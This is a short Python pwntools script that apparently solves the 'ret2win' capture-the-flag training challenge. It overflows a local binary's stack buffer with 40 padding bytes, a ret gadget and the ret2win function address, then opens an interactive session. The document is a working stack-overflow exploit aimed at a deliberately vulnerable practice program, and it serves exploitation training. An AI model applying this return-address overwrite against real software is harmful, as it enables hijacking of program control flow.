from pwn import *

binary='./ret2win'

context.binary=binary
context.log_level='debug'
elf=ELF(binary)

p=process(binary)

ret2win_add=elf.symbols['ret2win']
ret=0x000000000040053e

payload=b'A'*40
payload+=p64(ret)
payload+=p64(ret2win_add)
p.recvuntil(b"> ")
p.sendline(payload)

p.interactive()